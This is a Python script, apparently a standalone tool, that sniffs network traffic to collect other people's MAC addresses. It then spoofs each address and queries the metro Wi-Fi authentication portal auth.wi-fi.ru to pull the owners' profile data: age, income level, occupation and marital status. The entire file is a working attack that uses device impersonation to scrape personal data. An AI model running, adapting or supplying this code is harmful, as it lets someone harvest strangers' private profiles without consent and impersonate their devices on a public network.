# -*- coding: utf-8 -*-
import ujson
import time
import requests
import argparse
import sys
import os
import re
import spoofmac

MAP = dict()
MAP['5777de2cd9'] = 'age'
MAP['7ef6265d'] = '4500'
MAP['0ae09acd'] = '3544'
MAP['c40467ec'] = '1217'
MAP['00f0d9de'] = '1824'
MAP['fd5a4e2f'] = '2534'
MAP['3d2e2a0d80'] = 'profit'
MAP['785d323e'] = 'low'
MAP['85ebdc3d'] = 'high'
MAP['b8a058b4'] = 'medium'
MAP['cb19ed6f70'] = 'occupation'
MAP['1d049b46'] = 'student'
MAP['78051d61'] = 'unemployed'
MAP['4294e679'] = 'housewife'
MAP['5e97672e80'] = 'family_status'
MAP['b2ccc4af'] = 'not married'
MAP['d858a4ad'] = 'active search'
MAP['7dce1b03'] = 'married'


class Sniffer:

    def __init__(self, interface=None, filters=None, mac_file=None):
        self.interface = interface
        self.filters = filters
        self.macs = []
        self.self_macs = []
        self.mac_file = mac_file

        if os.path.isfile(mac_file):
            with open(mac_file) as f:
                for line in f:
                    self.macs.append(line.strip())
        else:
            with open(mac_file, 'w') as f:
                f.close()

    def __call__(self, *args, **kwargs):
        from scapy.all import sniff, get_if_hwaddr, get_if_list

        is_windows = sys.platform.startswith('win')
        if not is_windows:
            self.macs = [get_if_hwaddr(i) for i in get_if_list()]

        print(u'Listen with filter: {filters}'.format(filters=self.filters))

        sniff(iface=self.interface, filter=self.filters, prn=self.check_packet)

        return 'ok'

    def check_packet(self, packet):
        if packet.src:
            self.set_mac(packet.src)
        if packet.dst:
            self.set_mac(packet.dst)

    def set_mac(self, mac):
        if mac not in self.self_macs and mac not in self.macs:
            self.macs.append(mac)
            print('i find a new mac: ' + mac)

            with open(self.mac_file, 'a') as f:
                f.write(mac + '\n')


class Checker:

    def __init__(self, device, result_file=None, mac_file=None, reload_data=False):
        self.macs = []
        self.mac_file = mac_file
        self.result_file = result_file
        self.result_dict = dict()
        self.reload = reload_data
        self.device = device

        if os.path.isfile(mac_file):
            with open(mac_file) as f:
                for line in f:
                    self.macs.append(line.strip())

        if os.path.isfile(result_file):
            with open(result_file) as f:
                self.result_dict = ujson.load(f)

        if not isinstance(self.result_dict, dict):
            self.result_dict = dict()

    def __call__(self, *args, **kwargs):

        print(u'Checking...')

        for mac in self.macs:
            if mac not in self.result_dict.keys() or self.reload:
                print(u'Checking {mac}'.format(mac=mac))
                data = self.check_mac(mac)
                if data:
                    self.result_dict[mac] = data

                with open(self.result_file, 'w') as fh:
                    ujson.dump(self.result_dict, fh)
        return 'check in finished'

    def check_mac(self, mac):

        try:
            spoofmac.set_interface_mac(self.device, mac)
        except Exception as e:
            print('can not change mac {err}'.format(err=unicode(e)))
            return False

        res = dict(ok=False, error=False, data=dict())

        s = requests.Session()

        res_first = s.get('https://auth.wi-fi.ru/auth?segment=metro')
        if not res_first.status_code == 200:
            res['ok'] = False
            res['error'] = u'not 200 in first request'
            return False
        res_payload = s.get('https://auth.wi-fi.ru/auth?segment=metro&mac=ff-00-00-00-00-00')
        s.close()

        if not res_payload.status_code == 200:
            res['ok'] = False
            res['error'] = u'not 200 in first request'
            return False

        data = False

        match = re.search('(?<=var\suserData\s=\sJSON\.parse\(")(.*)(?="\s*.\s*replace\()', res_payload.text)

        if match:

            text_pos = match.span()
            data = res_payload.text[match.start():match.end()]

        else:
            res['error'] = 'not found userData'
            return res

        data = re.sub('\\\\&quot;', '"', data)

        for key, val in MAP.iteritems():
            data = data.replace(key, val)
        data_dict = dict()
        try:
            data_dict = ujson.decode(data)
        except ValueError as err:
            res['error'] = u'dont parse json {err}. Data: {data}'.format(err=unicode(err), data=data)
            return res

        if data_dict and (data_dict.get('groups_data') or data_dict.get('tags') or data_dict.get('groups')):
            res['data'] = data_dict
            res['ok'] = True
        else:
            print('no getting data from mac')
            return False

        return res


def run_app():
    parser = argparse.ArgumentParser(description='MT MAC checker')

    parser.add_argument('-m', '--macfile', help='file result for macs, default: macs.txt', default='macs.txt')

    user_subparsers = parser.add_subparsers(help='Supported commands for use')

    parser_add = user_subparsers.add_parser('sniff', help="Sniff MACs, use interface option")

    parser_add.add_argument('-i', '--interface', help='interface for use, default all')
    parser_add.add_argument('-f', '--filters', help='filers for sniff, default: tcp', default='tcp')

    parser_add = user_subparsers.add_parser('check', help="Check MACs")
    parser_add.add_argument('-r', '--result_file', help='Result file', default='mac_tests.txt')
    parser_add.add_argument('-d', '--device', help='device for change mac, default wlan0', default='wlan0')
    parser_add.add_argument('-u', '--update', help='Reload data for MAC', dest='update', action='store_true')

    args = parser.parse_args()

    if hasattr(args, 'filters'):
        sniffer = Sniffer(interface=args.interface, filters=args.filters, mac_file=args.macfile)
        result = sniffer()
        print(result)

    else:
        checker = Checker(args.device, mac_file=args.macfile, result_file=args.result_file, reload_data=args.update)
        result = checker()
        print(result)

    return 'ok'


if __name__ == "__main__":
    if sys.platform == 'win32':
        import ctypes

    try:
        root_or_admin = os.geteuid() == 0
    except AttributeError:
        root_or_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if root_or_admin:
        run_app()
    else:
        print('I need root...')

    exit(0)
